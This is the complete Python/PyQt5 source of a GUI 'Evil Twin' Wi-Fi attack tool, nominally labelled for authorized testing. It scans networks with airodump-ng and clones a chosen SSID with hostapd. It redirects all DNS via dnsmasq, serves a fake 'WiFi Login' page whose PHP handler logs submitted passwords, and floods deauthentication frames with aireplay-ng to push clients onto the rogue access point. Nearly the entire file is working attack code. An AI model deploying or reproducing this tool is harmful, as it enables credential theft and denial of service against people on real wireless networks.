from PyQt5.QtWidgets import *
from PyQt5.QtCore import QTimer, QDir
import subprocess
import sys
import os
import time

class EvilTwinTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ethical Evil Twin Tool (For Authorized Testing Only)")
        self.setGeometry(300, 300, 600, 500)
        
        # Variables
        self.target_ssid = ""
        self.target_bssid = ""
        self.target_channel = ""
        self.processes = []  # Track subprocesses for cleanup
        self.credentials_file = "/var/www/html/credentials.txt"
        
        # Layout
        layout = QVBoxLayout()
        
        self.setup_button = QPushButton("Setup Monitor Mode")
        self.setup_button.clicked.connect(self.setup_monitor_mode)
        layout.addWidget(self.setup_button)
        
        self.scan_button = QPushButton("Scan Networks")
        self.scan_button.clicked.connect(self.scan_networks)
        layout.addWidget(self.scan_button)
        
        self.network_list = QComboBox()
        layout.addWidget(self.network_list)
        
        self.select_button = QPushButton("Select Target")
        self.select_button.clicked.connect(self.select_target)
        layout.addWidget(self.select_button)
        
        self.attack_button = QPushButton("Launch Attack")
        self.attack_button.clicked.connect(self.launch_attack)
        layout.addWidget(self.attack_button)
        
        self.console = QPlainTextEdit()
        self.console.setReadOnly(True)
        layout.addWidget(self.console)
        
        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)
        
        # Timer to monitor credentials file
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.check_credentials)
        self.timer.start(5000)  # Check every 5 seconds
    
    def setup_monitor_mode(self):
        self.console.appendPlainText("[+] Setting up monitor mode...")
        try:
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
            
            # Start monitor on wlan0 and wlan1
            subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
            subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan1'])
            
            # Set channel on wlan0mon (assuming wlan0 becomes wlan0mon)
            if self.target_channel:
                subprocess.run(['sudo', 'iwconfig', 'wlan0mon', 'channel', self.target_channel])
            
            self.console.appendPlainText("[+] Monitor mode enabled on wlan0mon and wlan1mon.")
        except Exception as e:
            self.console.appendPlainText(f"[-] Error: {e}")
    
    def scan_networks(self):
        self.console.appendPlainText("[+] Scanning for networks...")
        try:
            # Ensure monitor mode
            if not os.path.exists('/sys/class/net/wlan0mon'):
                self.console.appendPlainText("[-] wlan0mon not found. Run setup first.")
                return
            
            # Run airodump-ng
            subprocess.run(['sudo', 'airodump-ng', 'wlan0mon', '--output-format', 'csv', '-w', 'scan', '--write-interval', '1'], timeout=10)
            
            # Parse CSV
            if os.path.exists('scan-01.csv'):
                with open('scan-01.csv', 'r') as f:
                    lines = f.readlines()
                    self.network_list.clear()
                    for line in lines:
                        if "ESSID" in line: continue
                        parts = line.split(',')
                        if len(parts) > 13 and parts[13].strip():
                            ssid = parts[13].strip()
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            self.network_list.addItem(f"{ssid} (BSSID: {bssid}, CH: {channel})")
                self.console.appendPlainText("[+] Scan complete. Select a target.")
            else:
                self.console.appendPlainText("[-] Scan file not found.")
        except subprocess.TimeoutExpired:
            self.console.appendPlainText("[+] Scan timed out, but partial results may be available.")
        except Exception as e:
            self.console.appendPlainText(f"[-] Error: {e}")
    
    def select_target(self):
        selected = self.network_list.currentText()
        if selected:
            self.target_ssid = selected.split(' (')[0]
            self.target_bssid = selected.split('BSSID: ')[1].split(',')[0]
            self.target_channel = selected.split('CH: ')[1].split(')')[0]
            self.console.appendPlainText(f"[+] Target selected: {self.target_ssid} (BSSID: {self.target_bssid}, CH: {self.target_channel})")
    
    def launch_attack(self):
        if not self.target_ssid:
            self.console.appendPlainText("[-] Select a target first!")
            return
        
        msg = QMessageBox()
        msg.setWindowTitle("Confirm Attack")
        msg.setText(f"Launch ethical test on {self.target_ssid}? Ensure authorization!")
        msg.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
        if msg.exec_() != QMessageBox.Ok:
            self.console.appendPlainText("[!] Attack cancelled.")
            return
        
        self.console.appendPlainText("[+] Preparing Evil Twin attack...")
        
        try:
            # Create captive portal files in /var/www/html/
            html_content = """
<!DOCTYPE html>
<html>
<head>
<title>WiFi Login</title>
</head>
<body>
<h2>Welcome</h2>
<form action="capture.php" method="POST">
<label>WiFi Password:</label>
<input type="password" name="password">
<input type="submit" value="Connect">
</form>
</body>
</html>
"""
            with open('/var/www/html/index.html', 'w') as f:
                f.write(html_content)
            
            php_content = """
<?php
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    file_put_contents("credentials.txt", "Password: " . $password . "\\n", FILE_APPEND);
    header("Location: https://google.com");
    exit();
}
?>
"""
            with open('/var/www/html/capture.php', 'w') as f:
                f.write(php_content)
            
            # Configure hostapd.conf (using wlan1, as in screenshots)
            hostapd_conf = f"""
interface=wlan1
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.target_channel or '6'}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
            with open('/etc/hostapd/hostapd.conf', 'w') as f:
                f.write(hostapd_conf)
            
            # Configure dnsmasq.conf
            dnsmasq_conf = """
interface=wlan1
dhcp-range=192.168.1.1,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/# /192.168.1.1
"""
            with open('/etc/dnsmasq.conf', 'w') as f:
                f.write(dnsmasq_conf)
            
            # Start services
            self.processes.append(subprocess.Popen(['sudo', 'service', 'apache2', 'start']))
            self.processes.append(subprocess.Popen(['sudo', 'dnsmasq', '-C', '/etc/dnsmasq.conf']))
            self.processes.append(subprocess.Popen(['xterm', '-e', 'sudo', 'hostapd', '/etc/hostapd/hostapd.conf']))
            self.processes.append(subprocess.Popen(['xterm', '-e', 'sudo', 'aireplay-ng', '--deauth', '1000', '-a', self.target_bssid, 'wlan0mon']))
            
            self.console.appendPlainText("[!] Attack running. Monitor console for credentials.")
        except Exception as e:
            self.console.appendPlainText(f"[-] Error: {e}")
    
    def check_credentials(self):
        if os.path.exists(self.credentials_file):
            with open(self.credentials_file, 'r') as f:
                creds = f.read()
                if creds:
                    self.console.appendPlainText(f"[+] Captured Credentials:\n{creds}")
                    # Optional: Clear file after display
                    # open(self.credentials_file, 'w').close()
    
    def closeEvent(self, event):
        self.console.appendPlainText("[+] Cleaning up...")
        for proc in self.processes:
            proc.terminate()
        # Stop services
        subprocess.run(['sudo', 'service', 'apache2', 'stop'])
        subprocess.run(['sudo', 'pkill', 'dnsmasq'])
        # Restore interfaces (optional)
        subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan0mon'])
        subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan1mon'])
        event.accept()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = EvilTwinTool()
    window.show()
    sys.exit(app.exec_())